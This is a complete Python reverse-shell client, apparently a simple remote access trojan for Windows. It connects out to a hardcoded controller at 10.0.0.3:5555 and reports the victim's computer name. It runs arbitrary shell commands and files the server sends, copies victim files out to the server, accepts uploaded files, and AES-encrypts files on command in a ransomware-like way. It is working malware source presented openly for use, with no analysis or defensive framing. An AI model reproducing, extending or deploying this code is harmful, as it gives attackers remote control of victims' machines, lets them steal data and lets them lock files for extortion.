import socket
import os
import subprocess
import sys
from AES import AES_Crypto

SERVER_HOST = "10.0.0.3"
SERVER_PORT = 5555
print(SERVER_PORT)


msg = ""





class Shell_Client():
    def __init__(self):
        self.conn = self.Get_Connection()
        self.path = os.path.abspath(os.getcwd()) + "\\"
        self.disks = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'


    def Get_Connection(self):
        so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # connect to the server
        so.connect((SERVER_HOST, SERVER_PORT))
        return so

    def Send_Requiered_First_Data(self):

        self.conn.send(os.environ['COMPUTERNAME'].encode())
        self.conn.send(b" " + self.path.encode())

    def Check_If_File_Exsists(self, command):
        if(len(command.split(" ")) > 2):
            return False
        file = command.split(" ")[1]
        print(self.path + file)
        if (os.path.isfile(self.path + file)):
            file = self.path + file
            return True, file
        if (os.path.isfile(file)):
            return True, file
        return False, " "


    def Handel_CD_Command(self, command):
        if (command == "cd .."):
            spl = self.path.split('\\')

            if (len(spl) > 2):
                self.path = ""
                for x in range(0, len(spl) - 2):
                    self.path += spl[x] + "\\"
                msg = 'PATH ' + self.path
            else:
                msg = "You are in the root of your disc!"

        else:
            path_to_go = command.split(" ")[1]
            if (path_to_go[0] == '"' and path_to_go[-1] == '"'): # in case its like this "path"
                path_to_go = path_to_go[1:-1]
            if os.path.isdir(self.path + "\\" + path_to_go): # if we try to go to dir that inside of the current dir
                self.path = self.path + path_to_go + "\\"
                msg = 'PATH ' + self.path
            elif (os.path.isdir(path_to_go)): # if we want to cd to other path in the computer
                self.path = path_to_go + "\\"
                msg = 'PATH ' + self.path
            else:
                msg = "Invalid path!"
        print(msg)
        self.conn.send(msg.encode())

    def Execute_File(self, file):
        os.system(file)


    def Execute_Command_in_The_Shell(self, command):
        if (command[6:] == 'dir'):
            proc = subprocess.Popen(command[6:] + ' "' + self.path + '"', shell=True, stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        else:
            proc = subprocess.Popen(command[6:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
        stdout_val = proc.stdout.read() + proc.stderr.read()
        print(stdout_val)
        self.conn.send(stdout_val)

    def Download_To_Server(self, file):
            print(file)
            file = open(file, 'rb')
            f1 = file.read(1024)
            while f1:
                if (len(f1) < 1024):
                    self.conn.send(f1 + "+".encode() * (1024 - len(f1)))
                    self.conn.send("EOF ".encode() + str((1024 - len(f1))).encode())
                    break
                self.conn.send(f1)
                f1 = file.read(1024)


    def Encrypt_File(self, file):

            enc = AES_Crypto()
            key = enc.Create_key(file)
            enc.Encrypt_File(file, key)
            msg = "Your file has been encrypted! \nNOTE: Your key is " + key + "\n" + "Use it to decrypt the file!"
            self.conn.send(msg.encode())
            if (self.conn.recv(1024).decode() == 'YES'):
                self.conn.send(str(
                    "File's place : " + file[0: file.rfind('.')] + "\n" + "Decryption KEY: " + key).encode())

    def Decrypt_File(self, file):

        key = self.conn.recv(1045).decode()
        enc = AES_Crypto()
        dec_file = enc.Decrypt_File(file, key)
        self.conn.send(dec_file.encode())

    def Get_File_From_Server(self, path_to_save, file_name):

        file = open(path_to_save + "\\" + file_name, 'wb')
        data_to_file = b''
        while True:
            #print('receiving data...')
            data = self.conn.recv(1024)
            if("EOF".encode() in data):
                if (int(data.decode().split(" ")[1]) > 0):
                    data_to_file = data_to_file[:-(int(data.decode().split(" ")[1]))]
                break
            data_to_file += data

        file.write(data_to_file)
        file.close()
        self.conn.send("The file Has been uploaded".encode())


    def Change(self, command):
        self.path = command[7:] + "\\"
        self.conn.send('PATH '.encode() + self.path.encode())


    def Main_Panel(self):
        self.Send_Requiered_First_Data()
        while True:
            # receive the command from the server
            command = self.conn.recv(1024).decode()
            print(command)
            if command == "exit":
                self.conn.close()
                break
            elif command[0:2] == 'cd':
                self.Handel_CD_Command(command)


            elif command[0:7] == 'execute':
                flag, file = self.Check_If_File_Exsists(command)
                if(flag):
                    msg ="Executed!"
                    self.Execute_File(file)
                else:
                    msg = "File not found"
                self.conn.send(msg.encode())


            elif command[0:5] == 'shell':
                self.Execute_Command_in_The_Shell(command)



            elif command[0:8] == 'download':
                flag, file = self.Check_If_File_Exsists(command)
                if(flag):
                    msg = "DOWNLOAD"
                    self.conn.send(msg.encode())
                    self.Download_To_Server(file)
                else:
                    msg = 'Invalid file name\ location!'
                    self.conn.send(msg.encode())


            elif command[0:7] == 'encrypt':
                flag, file = self.Check_If_File_Exsists(command)
                if (flag):
                    self.conn.send("encrypt".encode())
                    self.Encrypt_File(file)
                else:
                    self.conn.send("Invalid file/ path to the file".encode())


            elif command[0:7] == 'decrypt':
                flag, file = self.Check_If_File_Exsists(command)
                if (flag):
                    self.conn.send("decrypt".encode())
                    self.Decrypt_File(file)
                else:
                    self.conn.send("Invalid file/ path to the file".encode())


            elif command[0:6] == 'Upload':
                path_to_save = command.split(" ")[1]
                flag = False
                if path_to_save == 'D':
                    path_to_save = self.path
                    flag = True
                else:
                    flag = os.path.isdir(path_to_save)

                if (flag):
                    self.conn.send("PATH_FOUND".encode())
                    self.Get_File_From_Server(path_to_save, command.split(" ")[2])

                else:
                    self.conn.send("INVALID PATH".encode())

            elif command[0:6] == 'change':
                drives = ['%s:' % d for d in self.disks if os.path.exists('%s:' % d)]
                if command[7:] in drives:
                    self.Change(command)

                else:
                    self.conn.send("Invalid Disk!".encode())



            else:
                msg = 'Invalid command !'
                self.conn.send(msg.encode())


client_shell = Shell_Client()
client_shell.Main_Panel()

